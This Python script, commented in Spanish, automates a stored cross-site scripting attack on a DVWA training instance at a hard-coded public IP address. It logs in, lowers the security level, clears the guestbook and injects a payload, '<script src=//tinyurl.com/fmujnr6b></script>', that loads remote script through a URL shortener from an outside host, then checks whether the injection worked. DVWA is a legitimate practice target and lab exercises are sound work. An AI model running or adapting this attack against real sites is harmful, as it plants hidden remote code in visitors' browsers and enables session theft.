"""
DVWA Stored XSS - Script (login + security low + clear + payload + verificación)
Requisitos:
  pip install requests beautifulsoup4
Ajusta DVWA_BASE, USER y PASS según tu entorno.
"""

import sys
import re
import random
import string
import requests
from bs4 import BeautifulSoup

# Dirección base del entorno DVWA a atacar
DVWA_BASE = "http://74.179.81.132/dvwa"

# Credenciales de usuario para DVWA
USER = ""
PASS = ""


def get_token(html):
    """Extrae el token CSRF (user_token) desde un HTML de DVWA"""
    soup = BeautifulSoup(html, "html.parser")
    tok = soup.find("input", {"name": "user_token"})
    return tok["value"] if tok else None


def must_have_token(html, ctx):
    """Obtiene el token o termina el programa si no se encuentra"""
    tok = get_token(html)
    if not tok:
        print(f"No se encontró user_token en {ctx}")
        sys.exit(1)
    return tok


def login(session):
    """Realiza login en DVWA"""
    r = session.get(f"{DVWA_BASE}/login.php", timeout=10)
    token = must_have_token(r.text, "login.php")

    r = session.post(
        f"{DVWA_BASE}/login.php",
        data={"username": USER, "password": PASS, "Login": "Login", "user_token": token},
        timeout=10,
    )

    if "Login failed" in r.text:
        print("Login falló")
        sys.exit(1)

    print("Sesión iniciada correctamente")


def set_security_low(session):
    """Configura el nivel de seguridad de DVWA en 'low'"""
    r = session.get(f"{DVWA_BASE}/security.php", timeout=10)
    token = must_have_token(r.text, "security.php")

    r = session.post(
        f"{DVWA_BASE}/security.php",
        data={"security": "low", "seclev_submit": "Submit", "user_token": token},
        timeout=10,
    )

    # Algunas versiones no confirman el cambio con texto explícito
    if "security level is currently: low" not in r.text.lower():
        session.get(f"{DVWA_BASE}/security.php", timeout=10)

    print(f"Security cookie actual: {session.cookies.get('security')}")


def clear_guestbook(session, xss_base_url):
    """Limpia el guestbook antes de inyectar el payload"""
    r = session.get(xss_base_url, timeout=10)
    token = get_token(r.text)

    data = {"btnClear": "Clear Guestbook"}
    if token:
        data["user_token"] = token

    session.post(xss_base_url, data=data, timeout=10)
    print("Guestbook limpiado")


def inject_payload(session, marker, payload):
    """Inyecta el payload XSS y devuelve código de respuesta y URL"""
    xss_url = f"{DVWA_BASE}/vulnerabilities/xss_s/?id={marker}"
    session.headers.update({"User-Agent": f"XSS-Tester/{marker}"})

    # Obtener token si está presente
    r = session.get(xss_url, timeout=10)
    soup = BeautifulSoup(r.text, "html.parser")
    token_input = soup.find("input", {"name": "user_token"})
    token = token_input["value"] if token_input else None

    # Ajustar nombre y mensaje para cumplir con límites de DVWA
    name = f"rt-{marker}"[:10]
    message = payload[:50]

    data = {"txtName": name, "mtxMessage": message, "btnSign": "Sign Guestbook"}
    if token:
        data["user_token"] = token

    r = session.post(xss_url, data=data, timeout=10)
    print(f"POST realizado: status={r.status_code} length={len(r.text)}")

    return r.status_code, xss_url


def verify_injection(session, xss_url, marker, payload):
    """Verifica si el payload fue insertado correctamente"""
    r = session.get(xss_url, timeout=10)
    html = r.text

    escaped_payload = payload.replace("<", "&lt;").replace(">", "&gt;")

    hit_marker = marker in html
    hit_raw = payload in html
    hit_esc = escaped_payload in html

    if hit_marker or hit_raw or hit_esc:
        print("Inserción detectada.")
        print("  marker :", "OK" if hit_marker else "no")
        print("  raw    :", "OK" if hit_raw else "no")
        print("  escaped:", "OK" if hit_esc else "no")
    else:
        # Fallback: mostrar último mensaje renderizado
        soup = BeautifulSoup(html, "html.parser")
        last = None
        msgs = soup.select("div.message, pre, td")
        if msgs:
            last = str(msgs[-1])
        if last and (marker in last or payload in last or escaped_payload in last):
            print("Encontrado en el último registro renderizado del guestbook.")
        else:
            print(f"No se observó inserción. Validar en navegador/DB. marker={marker}")


def main():
    """Punto de entrada principal del script"""
    session = requests.Session()
    session.headers.update({"User-Agent": "XSS-Tester"})

    login(session)  # Paso 1: iniciar sesión
    set_security_low(session)  # Paso 2: establecer nivel bajo de seguridad

    # Paso 3: limpiar e inyectar
    xss_base_url = f"{DVWA_BASE}/vulnerabilities/xss_s/"
    clear_guestbook(session, xss_base_url)

    # Crear identificador único y payload
    uniq = "".join(random.choices(string.ascii_lowercase + string.digits, k=6))
    marker = f"x{uniq}"
    payload = '<script src=//tinyurl.com/fmujnr6b></script>'  # <= Máx. 50 caracteres

    status, xss_url = inject_payload(session, marker, payload)

    # Paso 4: verificación del resultado
    verify_injection(session, xss_url, marker, payload)

    print(f"Security cookie final: {session.cookies.get('security')}")


if __name__ == "__main__":
    main()
